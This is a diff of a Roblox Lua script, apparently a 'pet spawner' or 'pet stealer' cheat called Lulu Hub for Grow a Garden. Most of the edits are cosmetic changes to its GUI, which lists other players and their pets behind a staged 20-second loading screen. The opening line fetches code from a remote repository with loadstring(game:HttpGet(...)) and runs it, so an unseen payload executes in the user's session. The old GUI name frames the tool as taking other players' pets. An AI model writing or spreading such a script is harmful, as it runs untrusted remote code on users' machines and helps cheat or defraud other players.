@@ -1,29 +1,27 @@
 -- Load real pet spawner
 local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
 
--- Pets to randomize from
 local allPets = {
 	"Kitsune", "Raccoon", "Butterfly", "Disco Bee", "Corrupted Kitsune", "Dragonfly", "T-Rex"
 }
 
 local player = game.Players.LocalPlayer
 local gui = Instance.new("ScreenGui")
-gui.Name = "PRStylePetStealer"
+gui.Name = "LuluHubUI"
 gui.ResetOnSpawn = false
 gui.IgnoreGuiInset = true
 gui.Parent = player:WaitForChild("PlayerGui")
 
--- ⏳ Loading Screen
-local loadingFrame = Instance.new("Frame")
+-- Loading screen
+local loadingFrame = Instance.new("Frame", gui)
 loadingFrame.Size = UDim2.new(1, 0, 1, 0)
 loadingFrame.BackgroundColor3 = Color3.new(0, 0, 0)
 loadingFrame.ZIndex = 10
-loadingFrame.Parent = gui
 
 local message = Instance.new("TextLabel", loadingFrame)
 message.Size = UDim2.new(0.8, 0, 0.1, 0)
 message.Position = UDim2.new(0.1, 0, 0.45, 0)
-message.Text = "🔄 Loading your script... Please wait 20 seconds"
+message.Text = "🌸 Lulu Hub is preparing... Please wait 20 seconds"
 message.TextColor3 = Color3.new(1, 1, 1)
 message.BackgroundTransparency = 1
 message.TextScaled = true
@@ -36,37 +34,65 @@ glow.Thickness = 2
 glow.Color = Color3.fromRGB(255, 255, 255)
 glow.Transparency = 0.5
 
--- Toggle button
+-- Toggle Button
 local toggleBtn = Instance.new("TextButton", gui)
 toggleBtn.Size = UDim2.new(0, 120, 0, 40)
 toggleBtn.Position = UDim2.new(0, 10, 0, 10)
 toggleBtn.Text = "🌸 Lulu Hub"
-toggleBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+toggleBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
 toggleBtn.TextColor3 = Color3.new(1, 1, 1)
 toggleBtn.Font = Enum.Font.GothamBold
 toggleBtn.TextScaled = true
 toggleBtn.Visible = false
+toggleBtn.AutoButtonColor = true
 
--- Main container frame
+-- Main Frame
 local mainFrame = Instance.new("Frame", gui)
 mainFrame.Size = UDim2.new(0.6, 0, 0.6, 0)
 mainFrame.Position = UDim2.new(0.2, 0, 0.2, 0)
-mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+mainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
 mainFrame.Visible = false
 mainFrame.Active = true
 mainFrame.Draggable = true
 mainFrame.BorderSizePixel = 0
 
+-- Header Bar
+local header = Instance.new("Frame", mainFrame)
+header.Size = UDim2.new(1, 0, 0, 40)
+header.BackgroundColor3 = Color3.fromRGB(50, 50, 80)
+
+local hubLabel = Instance.new("TextLabel", header)
+hubLabel.Size = UDim2.new(1, -40, 1, 0)
+hubLabel.Position = UDim2.new(0, 10, 0, 0)
+hubLabel.Text = "🌸 Lulu Hub"
+hubLabel.TextColor3 = Color3.new(1, 1, 1)
+hubLabel.BackgroundTransparency = 1
+hubLabel.Font = Enum.Font.GothamBold
+hubLabel.TextScaled = true
+
+local closeBtn = Instance.new("TextButton", header)
+closeBtn.Size = UDim2.new(0, 40, 0, 40)
+closeBtn.Position = UDim2.new(1, -40, 0, 0)
+closeBtn.Text = "❌"
+closeBtn.TextScaled = true
+closeBtn.BackgroundColor3 = Color3.fromRGB(80, 40, 40)
+closeBtn.TextColor3 = Color3.new(1, 1, 1)
+closeBtn.Font = Enum.Font.GothamBold
+
+closeBtn.MouseButton1Click:Connect(function()
+	mainFrame.Visible = false
+end)
+
 -- Sidebar
 local sidebar = Instance.new("Frame", mainFrame)
-sidebar.Size = UDim2.new(0.3, 0, 1, 0)
-sidebar.Position = UDim2.new(0, 0, 0, 0)
-sidebar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+sidebar.Size = UDim2.new(0.3, 0, 1, -40)
+sidebar.Position = UDim2.new(0, 0, 0, 40)
+sidebar.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
 
 local sidebarLabel = Instance.new("TextLabel", sidebar)
 sidebarLabel.Size = UDim2.new(1, 0, 0, 30)
 sidebarLabel.Text = "Players"
-sidebarLabel.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+sidebarLabel.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
 sidebarLabel.TextColor3 = Color3.new(1, 1, 1)
 sidebarLabel.Font = Enum.Font.GothamBold
 sidebarLabel.TextScaled = true
@@ -76,29 +102,22 @@ playerScroll.Size = UDim2.new(1, 0, 1, -30)
 playerScroll.Position = UDim2.new(0, 0, 0, 30)
 playerScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
 playerScroll.ScrollBarThickness = 6
-playerScroll.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+playerScroll.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
 
--- Pet list panel
+-- Pet Panel
 local petPanel = Instance.new("Frame", mainFrame)
-petPanel.Size = UDim2.new(0.7, 0, 1, 0)
-petPanel.Position = UDim2.new(0.3, 0, 0, 0)
-petPanel.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-
-local petLabel = Instance.new("TextLabel", petPanel)
-petLabel.Size = UDim2.new(1, 0, 0, 30)
-petLabel.Text = "🌸 Lulu Hub"
-petLabel.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-petLabel.TextColor3 = Color3.new(1, 1, 1)
-petLabel.Font = Enum.Font.GothamBold
-petLabel.TextScaled = true
+petPanel.Size = UDim2.new(0.7, 0, 1, -40)
+petPanel.Position = UDim2.new(0.3, 0, 0, 40)
+petPanel.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
 
 local petScroll = Instance.new("ScrollingFrame", petPanel)
-petScroll.Size = UDim2.new(1, 0, 1, -30)
-petScroll.Position = UDim2.new(0, 0, 0, 30)
+petScroll.Size = UDim2.new(1, 0, 1, 0)
+petScroll.Position = UDim2.new(0, 0, 0, 0)
 petScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
 petScroll.ScrollBarThickness = 6
-petScroll.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+petScroll.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
 
+-- Logic
 local selectedBtn
 local selectedPlayer = nil
 local perPlayerPets = {}
@@ -126,7 +145,7 @@ local function loadPlayers()
 		btn.Position = UDim2.new(0, 4, 0, y)
 		btn.Text = plr.Name
 		btn.TextColor3 = Color3.new(1, 1, 1)
-		btn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+		btn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
 		btn.Font = Enum.Font.Gotham
 		btn.TextScaled = true
 
@@ -137,9 +156,9 @@ local function loadPlayers()
 		btn.MouseButton1Click:Connect(function()
 			selectedPlayer = plr.Name
 			if selectedBtn then
-				selectedBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+				selectedBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
 			end
-			btn.BackgroundColor3 = Color3.fromRGB(70, 100, 150)
+			btn.BackgroundColor3 = Color3.fromRGB(100, 80, 130)
 			selectedBtn = btn
 			loadPetList(perPlayerPets[plr.Name])
 		end)
@@ -158,7 +177,7 @@ function loadPetList(petList)
 		btn.Position = UDim2.new(0, 4, 0, y)
 		btn.Text = petData.name .. " (" .. (petData.max - petData.used) .. ")"
 		btn.TextColor3 = Color3.new(1, 1, 1)
-		btn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+		btn.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
 		btn.Font = Enum.Font.Gotham
 		btn.TextScaled = true
 
